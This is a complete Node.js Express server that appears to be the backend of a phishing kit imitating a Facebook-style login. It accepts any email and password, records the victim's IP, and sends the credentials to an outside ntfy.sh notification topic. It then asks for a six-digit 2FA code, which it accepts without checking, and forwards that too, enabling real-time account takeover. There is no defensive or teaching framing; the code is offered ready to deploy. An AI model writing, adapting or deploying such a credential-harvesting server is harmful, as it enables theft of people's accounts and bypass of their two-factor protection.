const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// ⚠️ IMPORTANT: Replace 'bkeyz-login-alerts' with YOUR ntfy topic (the one you subscribed to in the app)
const NTFY_TOPIC = 'fblogin-Alert';   // <-- CHANGE THIS if your topic is different

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Store pending sessions (email/password) until code is submitted
const pending = new Map();

// Send notification to ntfy
async function sendToNtfy(title, message, priority = 'high') {
    try {
        await axios.post(`https://ntfy.sh/${NTFY_TOPIC}`, message, {
            headers: {
                'Title': title,
                'Priority': priority,
                'Tags': 'warning,lock'
            }
        });
        console.log(`✅ ntfy sent: ${title}`);
        return true;
    } catch (error) {
        console.error(`❌ ntfy error: ${error.message}`);
        return false;
    }
}

// Step 1: Accept ANY email/password, store them, go to 2FA page
app.post('/api/login', (req, res) => {
    const { identifier, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    if (!identifier || !password) {
        return res.status(400).json({ error: 'Email and password required' });
    }

    // Create a unique session ID
    const sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 8);

    // Store credentials (expires in 10 minutes)
    pending.set(sessionId, {
        email: identifier,
        password: password,
        ip: ip,
        expires: Date.now() + 10 * 60 * 1000
    });

    // Send notification for step 1 (email+password)
    const msg1 = `🔐 STEP 1 - LOGIN CREDENTIALS\n━━━━━━━━━━━━━━━━━━━━━\n📧 Email: ${identifier}\n🔑 Password: ${password}\n🌍 IP: ${ip}\n⏰ Time: ${new Date().toLocaleString()}`;
    sendToNtfy('🔐 Login Credentials', msg1);

    // Always respond that 2FA is required
    res.json({ success: true, requires2FA: true, sessionId: sessionId });
});

// Step 2: Accept ANY 6-digit code, send notification, then login success
app.post('/api/verify-2fa', (req, res) => {
    const { sessionId, code } = req.body;

    if (!sessionId || !code) {
        return res.status(400).json({ error: 'Session ID and code required' });
    }

    const data = pending.get(sessionId);
    if (!data) {
        return res.status(400).json({ error: 'Session expired. Please login again.' });
    }
    if (Date.now() > data.expires) {
        pending.delete(sessionId);
        return res.status(400).json({ error: 'Session expired. Please login again.' });
    }

    // Send notification for step 2 (6-digit code)
    const msg2 = `🔐 STEP 2 - AUTHENTICATION CODE\n━━━━━━━━━━━━━━━━━━━━━\n📧 Email: ${data.email}\n🔑 Password: ${data.password}\n📱 6-digit Code: ${code}\n🌍 IP: ${data.ip}\n⏰ Time: ${new Date().toLocaleString()}`;
    sendToNtfy('🔐 2FA Code Received', msg2);

    // Clean up
    pending.delete(sessionId);

    // Always succeed (no code validation)
    res.json({ success: true, message: 'Login verified', user: { name: data.email.split('@')[0] || 'User' } });
});

// Register endpoint (optional, but keep for completeness)
app.post('/api/register', (req, res) => {
    const { name, email, password } = req.body;
    if (!name || !email || !password) {
        return res.status(400).json({ error: 'All fields required' });
    }
    if (password.length < 6) {
        return res.status(400).json({ error: 'Password must be 6+ characters' });
    }
    // In a real app you'd store in DB, but for demo we just succeed
    res.json({ success: true, message: 'Account created! Please login.' });
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', ntfyTopic: NTFY_TOPIC });
});

// Serve frontend
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📢 ntfy topic: ${NTFY_TOPIC}`);
});
